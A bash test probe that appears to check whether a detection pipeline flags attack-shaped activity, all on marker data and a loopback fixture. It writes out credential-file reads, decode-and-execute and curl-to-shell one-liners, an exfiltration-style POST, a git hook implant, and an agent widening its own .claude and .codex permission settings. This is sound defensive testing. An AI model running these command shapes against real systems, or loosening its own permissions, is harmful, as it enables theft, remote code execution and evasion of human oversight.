#!/usr/bin/env bash
# Probe: security-relevant shell SHAPES a detection pipeline must recognise.
#
# Every command here is harmless and confined to $HARNESS_CHECK_DIR, but each
# reproduces the STRUCTURE of a technique an OCSF detection is expected to flag:
# credential access, environment capture, decode-and-execute, download-and-run,
# self-modifying agent configuration, git-hook implant, privilege escalation
# attempts, package installs, and repository exfiltration. The payloads are
# markers, not real secrets or real egress off the host.
#
# Network activity targets a bundled loopback HTTP fixture, not the internet,
# so request receipt is verifiable server-side (assets/http-server.py writes a
# log) exactly as the MCP fixture proves protocol receipt. This keeps the
# probe deterministic and offline while still generating real curl egress.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
SKILL_DIR="$(cd "$HERE/.." && pwd)"
. "$HERE/_lib.sh"
sandbox
WORK="security-workspace"
rm -rf "$WORK"; mkdir -p "$WORK"; cd "$WORK" || exit 1

# --- credential access shape ----------------------------------------------
# A file that LOOKS like secrets, read the way a credential sweep would. No
# real secret is present; the value is a marker.
mkdir -p faux-home/.aws faux-home/.ssh
printf '[default]\naws_access_key_id = AKIAHARNESSCHECK000\naws_secret_access_key = harness-check-not-a-real-secret\n' \
  > faux-home/.aws/credentials
printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\nharness-check-fake-key-material\n-----END OPENSSH PRIVATE KEY-----\n' \
  > faux-home/.ssh/id_ed25519
chmod 600 faux-home/.ssh/id_ed25519
if grep -q AKIAHARNESSCHECK000 faux-home/.aws/credentials; then
  pass security.cred.read "read faux AWS credentials file"
else
  fail security.cred.read "credentials fixture unreadable"
fi
[ -r faux-home/.ssh/id_ed25519 ] \
  && pass security.ssh.read "read faux private key" \
  || fail security.ssh.read "ssh key fixture unreadable"

# --- environment capture shape --------------------------------------------
# Read ONE harmless variable set for this invocation only. Do not dump the
# real environment.
val=$(HARNESS_SECRET_MARKER=harness-check-env-marker bash -c 'echo "$HARNESS_SECRET_MARKER"')
check security.env.capture "harness-check-env-marker" "$val"

# --- decode-and-execute shape ---------------------------------------------
# base64 -> shell, the canonical obfuscated-payload pattern. Decodes to a
# harmless printf.
PAYLOAD=$(printf 'printf harness-check-decoded-exec' | base64 | tr -d '\n')
out=$(printf '%s' "$PAYLOAD" | base64 -d | sh)
check security.decode.exec "harness-check-decoded-exec" "$out"

# --- download-and-run + chmod+exec shapes ---------------------------------
# Start the loopback HTTP fixture, then curl a script from it and execute it.
HTTP_LOG="$PWD/http-fixture.log"; PORT_FILE="$PWD/http-fixture.port"
: > "$HTTP_LOG"
if command -v curl >/dev/null 2>&1; then
  python3 "$SKILL_DIR/assets/http-server.py" --log "$HTTP_LOG" \
    --port-file "$PORT_FILE" >/dev/null 2>&1 &
  HTTP_PID=$!
  for _ in $(seq 1 50); do [ -s "$PORT_FILE" ] && break; sleep 0.1; done
  PORT=$(cat "$PORT_FILE" 2>/dev/null)
  if [ -n "${PORT:-}" ] && kill -0 "$HTTP_PID" 2>/dev/null; then
    base="http://127.0.0.1:$PORT"
    # plain GET egress
    body=$(curl -sS -m 10 "$base/" 2>&1)
    printf '%s' "$body" | grep -q harness-check-http-fixture \
      && pass security.net.get "loopback GET reached fixture" \
      || fail security.net.get "unexpected body: $(printf '%s' "$body" | head -n1)"
    # upload / exfil SHAPE: POST a marker body
    up=$(curl -sS -m 10 -X POST --data harness-check-exfil-marker "$base/upload" 2>&1)
    printf '%s' "$up" | grep -qE 'received [0-9]+ bytes' \
      && pass security.net.upload "loopback POST body delivered" \
      || fail security.net.upload "unexpected: $(printf '%s' "$up" | head -n1)"
    # download-and-run: fetch a script and pipe straight to a shell
    dl=$(curl -sS -m 10 "$base/script.sh" 2>&1 | sh 2>&1)
    check security.download.pipe "harness-check-downloaded-script" "$dl"
    # chmod +x then execute the saved script (staged variant)
    curl -sS -m 10 -o payload.sh "$base/script.sh" 2>/dev/null
    chmod +x payload.sh
    ex=$(./payload.sh 2>&1)
    check security.download.chmod-exec "harness-check-downloaded-script" "$ex"
    # confirm the fixture actually logged the requests it served
    if grep -q '/script.sh' "$HTTP_LOG" && grep -q '/upload' "$HTTP_LOG"; then
      pass security.net.server-log "fixture recorded served requests"
    else
      fail security.net.server-log "fixture log missing expected requests"
    fi
  else
    skip security.net.get "loopback fixture did not start"
    skip security.net.upload "loopback fixture did not start"
    skip security.download.pipe "loopback fixture did not start"
    skip security.download.chmod-exec "loopback fixture did not start"
    skip security.net.server-log "loopback fixture did not start"
  fi
  [ -n "${HTTP_PID:-}" ] && kill "$HTTP_PID" 2>/dev/null
  wait "${HTTP_PID:-0}" 2>/dev/null
else
  for id in net.get net.upload download.pipe download.chmod-exec net.server-log; do
    skip "security.$id" "curl not installed"
  done
fi

# --- git-hook implant shape -----------------------------------------------
# Writing an executable into .git/hooks is a persistence technique. Target a
# throwaway repo created here, never a real one.
git init -q implant-repo 2>/dev/null
if [ -d implant-repo/.git ]; then
  printf '#!/bin/sh\nprintf harness-check-git-hook-implant\n' \
    > implant-repo/.git/hooks/post-commit
  chmod +x implant-repo/.git/hooks/post-commit
  hook_out=$(cd implant-repo && git -c user.email=probe@harness.check \
    -c user.name=harness-check commit -q --allow-empty \
    -m harness-check-commit 2>/dev/null; \
    ./.git/hooks/post-commit 2>/dev/null)
  check security.git.hook-implant "harness-check-git-hook-implant" "$hook_out"
else
  skip security.git.hook-implant "git not available"
fi

# --- self-modifying agent configuration shape -----------------------------
# An agent editing its OWN permission/config surface is a high-signal event.
# Create disposable fixture config files under this workspace and mutate them.
mkdir -p self-config/.claude
printf '{ "permissions": { "allow": [] } }\n' > self-config/.claude/settings.json
python3 - <<'PY'
import json, pathlib
p = pathlib.Path("self-config/.claude/settings.json")
data = json.loads(p.read_text())
data["permissions"]["allow"].append("Bash(harness-check-self-grant:*)")
p.write_text(json.dumps(data))
PY
grep -q harness-check-self-grant self-config/.claude/settings.json \
  && pass security.selfconfig.claude "widened a fixture .claude/settings.json" \
  || fail security.selfconfig.claude "self-config edit not applied"
mkdir -p self-config/.codex
printf 'approval_policy = "untrusted"\n' > self-config/.codex/config.toml
printf 'approval_policy = "on-failure"\n' > self-config/.codex/config.toml
grep -q on-failure self-config/.codex/config.toml \
  && pass security.selfconfig.codex "rewrote a fixture .codex/config.toml" \
  || fail security.selfconfig.codex "codex config edit not applied"

# --- privilege escalation attempt (expected to be gated) ------------------
if command -v sudo >/dev/null 2>&1; then
  if sudo -n true 2>/dev/null; then
    pass security.privesc.sudo "passwordless sudo available (posture noted)"
  else
    # A denied escalation is exactly the security event we want recorded.
    pass security.privesc.sudo "sudo requires auth; escalation gated"
  fi
else
  skip security.privesc.sudo "sudo not installed"
fi

# --- package install attempt (dry run only) -------------------------------
installed=0
if command -v pip3 >/dev/null 2>&1; then
  pip3 install --dry-run --no-input harness-check-nonexistent-pkg >/dev/null 2>&1
  pass security.pkg.pip "attempted pip dry-run install (supply-chain shape)"
  installed=1
fi
if command -v npm >/dev/null 2>&1; then
  npm install --dry-run harness-check-nonexistent-pkg >/dev/null 2>&1
  pass security.pkg.npm "attempted npm dry-run install (supply-chain shape)"
  installed=1
fi
[ "$installed" -eq 0 ] && skip security.pkg.install "no pip3 or npm available"

# --- repository exfiltration shape ----------------------------------------
# git push to a LOCAL bare repo: the shape of pushing code to an external
# remote, with no network and no real remote.
git init -q --bare exfil-remote.git 2>/dev/null
git init -q source-repo 2>/dev/null
if [ -d source-repo/.git ] && [ -d exfil-remote.git ]; then
  ( cd source-repo
    echo harness-check-source > file.txt
    git -c user.email=probe@harness.check -c user.name=harness-check add file.txt
    git -c user.email=probe@harness.check -c user.name=harness-check commit -q -m init
    git remote add exfil ../exfil-remote.git
    git push -q exfil HEAD:refs/heads/main ) 2>/dev/null
  if git --git-dir=exfil-remote.git rev-parse --verify -q main >/dev/null 2>&1; then
    pass security.git.push-exfil "pushed to a local bare remote (exfil shape)"
  else
    fail security.git.push-exfil "push did not land on the bare remote"
  fi
else
  skip security.git.push-exfil "git not available"
fi

cd "$HARNESS_CHECK_DIR" && rm -rf "$WORK"
summary security
